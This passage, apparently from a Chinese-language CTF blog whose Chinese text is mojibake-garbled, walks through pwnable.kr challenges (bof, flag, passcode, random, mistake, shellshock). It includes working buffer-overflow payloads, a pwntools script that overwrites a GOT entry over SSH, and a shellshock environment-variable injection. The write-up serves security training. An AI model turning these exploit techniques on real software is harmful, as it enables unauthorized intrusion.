class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ä¿æŠ¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">$ pwn checksec code/bof<br>[*] <span class="hljs-string">&#x27;/home/philo/code/bof&#x27;</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>funcå‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°keyï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯0xdeadbeefï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªå‚æ•°æ”¹ä¸º0xcafebabeï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘system(â€œ/bin/shâ€)</p><p>ç®—ä¸€ä¸‹åç§»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-2Ch] BYREF</span><br></code></pre></td></tr></table></figure><p><code>payload=b&#39;a&#39;*(0x2c+8)+p32(0xcafebabe)</code></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>çœ‹ä¸€ä¸‹ä¿æŠ¤</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./flag</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/code/flag&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br>    <span class="hljs-attr">Packer:</span>   <span class="hljs-string">Packed</span> <span class="hljs-string">with</span> <span class="hljs-string">UPX</span><br></code></pre></td></tr></table></figure><p>åŠ äº†upxå£³ï¼Œæºè±æ°ï¼Œæœ‰bearæ¥</p><p>è„±ä¸ªå£³</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install upx</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> upx -d flag</span><br>                       Ultimate Packer for eXecutables<br>                          Copyright (C) 1996 - 2018<br>UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018<br><br>        File size         Ratio      Format      Name<br>   --------------------   ------   -----------   -----------<br>    883745 &lt;-    335288   37.94%   linux/amd64   flag<br><br>Unpacked 1 file.<br></code></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹ä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> pwn checksec ./flag</span><br>[*] &#x27;/home/philo/code/flag&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠflagcopyåˆ°äº†dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I will malloc() and strcpy the flag there. take it.&quot;</span>, argv, envp);<br>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100LL</span>);<br>  <span class="hljs-built_in">strcpy</span>(dest, flag);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹flagçš„å¼•ç”¨</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span> flag            dq offset aUpxSoundsLikeA<br><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span>                                         ; DATA XREF: main+20â†‘r<br><span class="hljs-string">.data</span><span class="hljs-function">:00000000006C2070</span>                                         ; <span class="hljs-string">&quot;UPX...? sounds like a delivery service &quot;</span><span class="hljs-string">...</span><br><br><span class="hljs-string">.rodata</span><span class="hljs-function">:0000000000496628</span> aUpxSoundsLikeA db &#x27;UPX.<span class="hljs-string">..</span>? sounds like a delivery service :)&#x27;,0<br><span class="hljs-string">.rodata</span><span class="hljs-function">:0000000000496628</span>                                         ; DATA XREF: <span class="hljs-string">.data</span><span class="hljs-function">:flag</span>â†“o<br></code></pre></td></tr></table></figure><p>ä¸€ç›®äº†ç„¶äº†</p><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><blockquote><p>è¿™ä¸ªé¢˜å€’æ˜¯æ¯”è¾ƒæœ‰æ„æ€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">login</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">int</span> passcode1;<br>        <span class="hljs-keyword">int</span> passcode2;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode1 : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode1);<br>        fflush(<span class="hljs-built_in">stdin</span>);<br><br>        <span class="hljs-comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode2 : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode2);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;checking...\n&quot;</span>);<br>        <span class="hljs-keyword">if</span>(passcode1==<span class="hljs-number">338150</span> &amp;&amp; passcode2==<span class="hljs-number">13371337</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login OK!\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login Failed!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">welcome</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">char</span> name[<span class="hljs-number">100</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter you name : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%100s&quot;</span>, name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome %s!\n&quot;</span>, name);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);<br><br>        welcome();<br>        login();<br><br>        <span class="hljs-comment">// something after login...</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>scanf(&quot;%100s&quot;, name);</code>è¯­å¥å°†è¾“å…¥çš„å­—ç¬¦ä¸²å†™åˆ°nameæ•°ç»„é‡Œé¢ï¼Œç”±äºwelcomeå‡½æ•°è°ƒç”¨å®Œä¹‹åä¼šå›æ”¶æ ˆç©ºé—´ï¼Œä½†æ˜¯æ ˆç©ºé—´å†…çš„æ•°æ®ä¸ä¼šè¢«æ¸…ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™å…¥çš„å­—ç¬¦ä¸²çš„å€¼å½±å“loginå‡½æ•°çš„æ ˆçš„å†…å­˜ã€‚æ­¤å¤–ï¼Œä¸¤ä¸ªæ ˆçš„espéƒ½æ˜¯ç›¸åŒçš„</p><p>æ³¨æ„åˆ°loginå‡½æ•°å†…çš„<code>scanf(&quot;%d&quot;, passcode1);</code>è¯­å¥</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæ­£ç¡®çš„è¯­å¥åº”è¯¥æ˜¯<code>scanf(&quot;%d&quot;, &amp;passcode1);</code>ï¼Œè¿™æ ·çš„è¯ï¼Œä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å€¼å†™åˆ°passcode1çš„åœ°å€å¯¹åº”çš„å†…å­˜ä¸­</p><p>ç”±äº<code>scanf(&quot;%d&quot;, passcode1);</code>å°‘äº†ä¸€ä¸ª&amp;ç¬¦å·ï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥çš„å€¼ä¼šå†™åˆ°passcode1çš„<strong>å†…å®¹</strong>å¯¹åº”çš„å†…å­˜ä¸­</p><p>æ¯”å¦‚è¯´ï¼Œpasscode1çš„å€¼ä¸º0xaaaabbbbccccddddï¼Œé‚£ä¹ˆ0xaaaabbbbccccddddåœ°å€å¤„çš„å€¼ä¼šè¢«æ”¹å†™ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ•°æ®</p><p><strong>ä½¿ç”¨idaè®¡ç®—åç§»</strong></p><ul><li>nameæ˜¯ebp-70h</li><li>passcode1æ˜¯ebp-10h</li></ul><p>å› æ­¤nameå¾€ä¸Š0x60å¤„ä¾¿æ˜¯passcode1çš„èµ·å§‹å¤„</p><p><code>payload=b&#39;a&#39;*(0x60)+p32(elf.got[&#39;fflush&#39;])</code>å°†passcode1çš„å€¼æ”¹å†™ä¸ºfflushå‡½æ•°çš„gotè¡¨çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¾“å…¥æ”¹å†™fflushçš„gotè¡¨</p><p>æ‰¾åˆ°è¿”å›åœ°å€0x080485E3</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485E3</span>                 mov     dword ptr [esp], <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;/bin/cat flag&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>EA                 call    <span class="hljs-title">_system</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>EF                 leave<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">080485</span>F0                 retn<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ssh = ssh(host=<span class="hljs-string">&#x27;pwnable.kr&#x27;</span>,user=<span class="hljs-string">&#x27;passcode&#x27;</span>,password=<span class="hljs-string">&#x27;guest&#x27;</span>,port=<span class="hljs-number">2222</span>)<br>sh=ssh.process(<span class="hljs-string">&#x27;./passcode&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./passcode&#x27;</span>)<br><br>sh.recv()<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x60</span>)+p32(elf.got[<span class="hljs-string">&#x27;fflush&#x27;</span>])<br><br>sh.sendline(payload)<br><br>sh.recv()<br><br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x080485E3</span>))<br>sleep(<span class="hljs-number">0.5</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> random;<br>        random = rand();        <span class="hljs-comment">// random value!</span><br><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;key);<br><br>        <span class="hljs-keyword">if</span>( (key ^ random) == <span class="hljs-number">0xdeadbeef</span> )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good!\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹æ‰‹å†Œï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DESCRIPTION<br>       The  rand()  <span class="hljs-keyword">function</span>  <span class="hljs-keyword">returns</span>  a  pseudo-random <span class="hljs-type">integer</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">range</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> RAND_MAX inclusive<br>       (i.e., the mathematical range [<span class="hljs-number">0</span>, RAND_MAX]).<br><br>       The srand() <span class="hljs-keyword">function</span> sets its argument <span class="hljs-keyword">as</span> the seed <span class="hljs-keyword">for</span> a <span class="hljs-built_in">new</span> <span class="hljs-keyword">sequence</span> <span class="hljs-keyword">of</span> pseudo-random  inteâ€<br>       gers  <span class="hljs-keyword">to</span>  be  returned <span class="hljs-keyword">by</span> rand().  These <span class="hljs-keyword">sequences</span> are <span class="hljs-keyword">repeatable</span> <span class="hljs-keyword">by</span> calling srand() <span class="hljs-keyword">with</span> the<br>       same seed <span class="hljs-keyword">value</span>.<br><br>       <span class="hljs-keyword">If</span> <span class="hljs-keyword">no</span> seed <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> provided, the rand() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> automatically seeded <span class="hljs-keyword">with</span> a <span class="hljs-keyword">value</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1.</span><br><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸è°ƒç”¨srandï¼Œç›´æ¥è°ƒç”¨randç›¸å½“äºæŠŠç§å­å€¼è®¾ç½®ä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡çš„randå€¼éƒ½æ˜¯ä¸€æ ·çš„</p><p> $key == 0xdeadbeef$ï¼Œå› æ­¤$key=0xdeadbeef âŠ• random$</p><h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PW_LEN 10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> XORKEY 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">xor</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* s, <span class="hljs-keyword">int</span> len)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;len; i++)&#123;<br>                s[i] ^= XORKEY;<br>        &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br><br>        <span class="hljs-keyword">int</span> fd;<br>        <span class="hljs-keyword">if</span>(fd=open(<span class="hljs-string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="hljs-number">0400</span>) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸€è¡Œ</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not bruteforce...\n&quot;</span>);<br>        sleep(time(<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>);<br><br>        <span class="hljs-keyword">char</span> pw_buf[PW_LEN+<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="hljs-number">0</span>))&#123;<span class="hljs-comment">//ä»æ ‡å‡†è¾“å…¥è¯»å–å†…å®¹åˆ°pw_buf</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read error\n&quot;</span>);<br>                close(fd);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">char</span> pw_buf2[PW_LEN+<span class="hljs-number">1</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input password : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%10s&quot;</span>, pw_buf2);<br><br>        <span class="hljs-comment">// xor your input</span><br>        <span class="hljs-keyword">xor</span>(pw_buf2, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password OK\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong Password\n&quot;</span>);<br>        &#125;<br><br>        close(fd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„çœ‹<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>ï¼Œè¿™é‡Œå…ˆæ˜¯æ‰§è¡Œ<code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>ï¼Œç”±äºopençš„è¿”å›å€¼æ˜¯æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¼šå¤§äº0ï¼Œå› æ­¤æ­¤è¡¨è¾¾å¼çš„å€¼ä¸º0ï¼Œä¹Ÿå³æ˜¯è¯´ï¼Œfdè¢«èµ‹å€¼ä¸º0</p><p>ä¹‹åä¼š</p><ul><li>ä»æ ‡å‡†è¾“å…¥è¯»å–å†…å®¹åˆ°pw_buf</li><li>ä»æ ‡å‡†è¾“å…¥è¯»å–å†…å®¹åˆ°pw_buf2</li><li>å°†pw_buf2é€ä¸ªå­—èŠ‚ä¸1è¿›è¡Œå¼‚æˆ–</li></ul><p>å¦‚æœå¼‚æˆ–åçš„ç»“æœä¸pw_bufç›¸åŒï¼Œåˆ™è¾“å‡ºflag</p><p>ç¬¬ä¸€æ¬¡è¾“å…¥10ä¸ª1ï¼Œç¬¬äºŒæ¬¡è¾“å…¥10ä¸ª0ï¼Œé‚£ä¹ˆ10ä¸ª0ä¼šåˆ†åˆ«ä¸1è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°1ï¼Œä»è€Œè¾“å‡ºflag</p><h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>        setresuid(getegid(), getegid(), getegid());<br>        setresgid(getegid(), getegid(), getegid());<br>        system(<span class="hljs-string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºå¼€äº†ä¸ªbash</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span> foo=<span class="hljs-string">&#x27;() &#123; echo &quot;wdnmd&quot;; &#125; ;/bin/cat ~/flag;&#x27;</span><br>shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>export foo<br>shellshock<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./shellshock<br>only if I knew CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span> ten years ago..!!<br>Segmentation fault (core dumped)<br></code></pre></td></tr></table></figure><p>åŸç†ï¼šbashå¼€å­è¿›ç¨‹çš„æ—¶å€™ï¼Œä¼šå°†ç¯å¢ƒå˜é‡é”™è¯¯è§£é‡Šä¸ºå‡½æ•°ï¼Œå¹¶æ‰§è¡Œã€‚å‚è€ƒï¼š<a href="https://github.com/LaPhilosophie/seedlab/tree/main/shellshock">https://github.com/LaPhilosophie/seedlab/tree/main/shellshock</a></p><p>æœ‰äº›é¢˜å’Œpwnæ— å…³ï¼Œkræš‚æ—¶åˆ°æ­¤ä¸ºæ­¢äº†</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnå…¥é—¨</title>
    <link href="/p/6eb2f886/"/>
    <url>/p/6eb2f886/</url>
    
